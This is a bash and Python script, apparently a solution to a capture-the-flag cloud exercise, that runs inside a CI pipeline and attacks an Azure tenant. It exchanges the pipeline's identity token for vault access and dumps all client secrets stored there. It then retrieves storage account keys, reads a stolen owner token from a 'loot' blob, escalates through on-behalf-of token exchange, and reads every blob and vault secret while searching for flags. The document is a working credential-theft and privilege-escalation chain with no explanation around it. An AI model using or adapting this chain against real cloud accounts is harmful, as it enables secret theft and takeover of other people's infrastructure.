#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re,hmac,hashlib,base64,datetime
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; XV="2021-08-06"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
SYNC="462d1c38-4459-48b8-9333-82e389e59514"
def rq(u,t,method="GET",data=None):
    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t},method=method,data=data),timeout=25).read().decode()
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:160]
        except:return "ERR:"+str(e)
def post(d):
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",urllib.parse.urlencode(d).encode(),timeout=20))
    except Exception as e:
        try:return json.loads(e.read().decode())
        except:return {"error":str(e)}
def tok(c,x,sc):
    r=post({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc});return r.get("access_token")
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
def sk(acct,key,path,params):
    date=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    ch=f"x-ms-date:{date}\nx-ms-version:{XV}\n";cr=f"/{acct}{path}"
    for k in sorted(params):cr+=f"\n{k}:{params[k]}"
    sts="\n".join(["GET","","","","","","","","","","",""])+"\n"+ch+cr
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    url=f"https://{acct}.blob.core.windows.net{path}"+("?"+urllib.parse.urlencode(params) if params else "")
    r=urllib.request.Request(url,headers={"Authorization":f"SharedKey {acct}:{sig}","x-ms-date":date,"x-ms-version":XV})
    try:return urllib.request.urlopen(r,timeout=25).read().decode('utf-8','replace')
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
def readall(acct,key):
    for c in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,"/",{"comp":"list"})):
        for b in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,f"/{c}",{"restype":"container","comp":"list"})):
            d=sk(acct,key,f"/{c}/{urllib.parse.quote(b)}",{});hit(f"{acct}/{c}/{b}",d);print(f"   {acct}/{c}/{b} ({len(d)}b):",d[:250].replace(chr(10)," "))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps={}
for s in json.loads(rq(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(rq(s["id"]+"?api-version=7.4",VT))["value"]);sps[j["appId"]]=j["clientSecret"]
    except:pass
SYNC_SEC=sps.get(SYNC); print("sync secret:",bool(SYNC_SEC))
# resource ids + cilogs key
at0=tok("038bc35d-131d-4953-9985-ff4a245ccec1",sps.get("038bc35d-131d-4953-9985-ff4a245ccec1"),"https://management.azure.com/.default")
ids={}
for r in json.loads(rq(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at0)).get("value",[]):
    if r.get("type")=="Microsoft.Storage/storageAccounts":ids[r["name"]]=r["id"]
ats=tok(SYNC,SYNC_SEC,"https://management.azure.com/.default")
ck=None
lk=rq(f"https://management.azure.com{ids['sttblcilogsprodx3euoz']}/listKeys?api-version=2023-01-01",ats,method="POST",data=b"")
if '"keys"' in lk:ck=json.loads(lk)["keys"][0]["value"]
aot=json.loads(sk("sttblcilogsprodx3euoz",ck,"/loot/armowner_token.json",{})).get("armowner_token")
print("aot len",len(aot) if aot else 0)
def obo(scope):
    return post({"grant_type":"urn:ietf:params:oauth:grant-type:jwt-bearer","client_id":SYNC,"client_secret":SYNC_SEC,"assertion":aot,"scope":scope,"requested_token_use":"on_behalf_of"})
for scope in ["https://management.azure.com/.default","https://vault.azure.net/.default"]:
    r=obo(scope); t=r.get("access_token")
    print("OBO",scope,"->", "OK len="+str(len(t)) if t else json.dumps(r)[:200])
    if not t:continue
    if "management" in scope:
        for acct,rid in ids.items():
            l=rq(f"https://management.azure.com{rid}/listKeys?api-version=2023-01-01",t,method="POST",data=b"")
            if '"keys"' in l:print("OBO listKeys",acct,"OK");readall(acct,json.loads(l)["keys"][0]["value"])
            else:print("OBO listKeys",acct,":",l[:80])
    else:
        for V in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
            r2=rq(f"https://{V}.vault.azure.net/secrets?api-version=7.4",t)
            print("OBO vault",V,":",r2[:120]);hit("sec",r2)
            try:
                for s in json.loads(r2)["value"]:
                    val=rq(s["id"]+"?api-version=7.4",t);hit(V+":"+s["id"].rsplit("/",1)[-1],val);print("   ",s["id"].rsplit("/",1)[-1],"=",json.loads(val).get("value","")[:200])
            except:pass
print("== done ==")
PY
